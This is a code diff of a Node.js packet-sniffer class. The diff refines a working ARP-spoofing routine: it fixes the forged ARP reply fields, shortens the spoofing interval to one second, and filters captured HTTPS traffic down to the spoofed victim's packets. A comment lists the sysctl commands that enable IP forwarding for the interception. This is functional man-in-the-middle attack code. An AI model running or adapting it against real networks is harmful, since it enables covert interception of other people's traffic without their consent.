@@ -5,15 +5,17 @@ const sni = require('sni')
 // sudo sysctl -w net.inet.ip.forwarding=1
 // sudo sysctl -w net.inet.ip.fw.enable=1
 // https://www.npmjs.com/package/electron-sudo
-class PcapSniffer {
+class Sniffer {
 
   constructor () {
-    this.name = 'PcapSniffer'
+    this.name = 'Sniffer'
     this.sniff = false
+    // FIXME: Need to get active interface from other tool
     this._if = 'en0'
     this.initComplete = false
     this._client = null
     this.arpInterval = null
+    this.arpIntervalPeriod = 1000
     this.arpTarget = null
     try {
       this.session = pcap.createSession(this._if, pcapFilters.https)
@@ -50,6 +52,29 @@ class PcapSniffer {
         this.error('Client socket not found!')
       }
     }
+    // try {
+    //   this.info('In init')
+    //   if (!this.initComplete) {
+    //     this.session = pcap.createSession(this._if, pcapFilters.https)
+    //     this.session.on('packet', this._cb.bind(this))
+    //     this.initComplete = true
+    //     this.info('Sniffer initComplete')
+    //   } else {
+    //     this.info('Sniffer session already loaded')
+    //   }
+    // } catch (err) {
+    //   if (this._client) {
+    //     this._client.emit('bpfError')
+    //   } else {
+    //     this.error('Client socket not found!')
+    //   }
+    // }
+  }
+
+  cmd (name, ...args) {
+    if (name === 'updateTarget') {
+      this.updateTarget(this._client, ...args)
+    }
   }
 
   start (socket) {
@@ -57,6 +82,7 @@ class PcapSniffer {
   }
 
   stop (socket) {
+    this.info('Stop')
     this.sniff = false
     this.stopArpSpoof()
   }
@@ -66,7 +92,7 @@ class PcapSniffer {
       this.arpInterval = setInterval(() => {
         this.arpPack(params.toTarget)
         this.arpPack(params.toRouter)
-      }, 5000)
+      }, this.arpIntervalPeriod)
       this.info(`Start arp spoof. target:${params.toRouter.src_ip}`)
       this.arpTarget = params.toRouter.src_ip
     } else {
@@ -75,7 +101,7 @@ class PcapSniffer {
       this.arpInterval = setInterval(() => {
         this.arpPack(params.toRouter)
         this.arpPack(params.toTarget)
-      }, 5000)
+      }, this.arpIntervalPeriod)
       this.arpInterval = null
       this.arpTarget = null
       this.startArpSpoof(params)
@@ -95,21 +121,23 @@ class PcapSniffer {
     let params = {}
     params.toRouter = {
       src_ip: d.target_ip,
-      src_mac: d.self_mac,
+      src_mac: d.target_mac,
+      self_mac: d.self_mac,
       target_ip: d.gw_ip,
       target_mac: d.gw_mac
     }
 
     params.toTarget = {
       src_ip: d.gw_ip,
-      src_mac: d.self_mac,
+      src_mac: d.gw_mac,
+      self_mac: d.self_mac,
       target_ip: d.target_ip,
       target_mac: d.target_mac
     }
     this.startArpSpoof(params)
   }
 // src ip  (the IP you're targetting )
-// src mac (your OWN mac address)
+// src mac (the MAC you're targetting)
 // target ip : gw (the node youre telling)
 // target mac: gw (the node youre telling)
 // {src_ip: '192.168.1.35',
@@ -121,13 +149,14 @@ class PcapSniffer {
       'op': 'request',
       'src_ip': config.src_ip,
       'src_mac': config.src_mac,
+      'self_mac': config.self_mac,
       'dst_ip': config.target_ip,
       'dst_mac': config.target_mac
     }
 
     let pkt = {}
-    pkt.dst = this.macToArr('ff:ff:ff:ff:ff:ff')
-    pkt.src = this.macToArr(pktConfig.src_mac)
+    pkt.dst = this.macToArr(pktConfig.dst_mac)
+    pkt.src = this.macToArr(pktConfig.self_mac)
 
     // ARP
     pkt.ether_type = [0x08, 0x06]
@@ -137,7 +166,7 @@ class PcapSniffer {
     pkt.proto_len = [0x04]
     pkt.op = [0x00, 0x02]
 
-    pkt.src_mac = this.macToArr(pktConfig.src_mac)
+    pkt.src_mac = this.macToArr(pktConfig.self_mac)
     pkt.src_ip = this.ipToArr(pktConfig.src_ip)
     pkt.dst_mac = this.macToArr(pktConfig.dst_mac)
     pkt.dst_ip = this.ipToArr(pktConfig.dst_ip)
@@ -153,10 +182,14 @@ class PcapSniffer {
   }
 
   _cb (raw) {
-    const packet = pcap.decode.packet(raw)
-    const parsed = this._parse(packet, raw)
-    if (this._client && parsed) {
-      this._client.emit('newPacket', parsed)
+    try {
+      const packet = pcap.decode.packet(raw)
+      const parsed = this._parse(packet, raw)
+      if (this._client && parsed) {
+        this._client.emit('newPacket', parsed)
+      }
+    } catch (err) {
+      this.error(err)
     }
   }
 
@@ -177,9 +210,18 @@ class PcapSniffer {
       }
       return false
     }
-    // if(this.arpTarget){
 
-    // }
+    if (this.arpTarget) {
+      const src = ip.saddr.addr.join('.')
+      const dst = ip.daddr.addr.join('.')
+      //
+      if (this.arpTarget !== src && this.arpTarget !== dst) {
+        // console.log(`target: ${this.arpTarget} src: ${src} dst: ${dst}`)
+        // console.log(`ignoring packet that isnt ${this.arpTarget }`)
+        return false
+      }
+    }
+
     if (!tcp.data) {
       return false
     }
@@ -263,17 +305,4 @@ class PcapSniffer {
   }
 }
 
-module.exports = PcapSniffer
-
-    // for (var i = 0; i < httpHeaders.length; i++) {
-    //   //;
-
-    //   httpHeaders[i] = httpHeaders[i].replace(/[\x00-\xFF]/, "")//(/[^A-Za-z 0-9 \.,\?""!@#\$%\^&\*\(\)-_=\+;:<>\/\\\|\}\{\[\]`~]*/g, '') ;
-    //   // if(httpHeaders[i].search(/(\\u\d{4})/) > -1){
-    //   //   console.log()
-    //   // }
-    // }
-
-    // console.log(httpHeaders)
-//
-// /[^\000-\031]+/
+module.exports = Sniffer
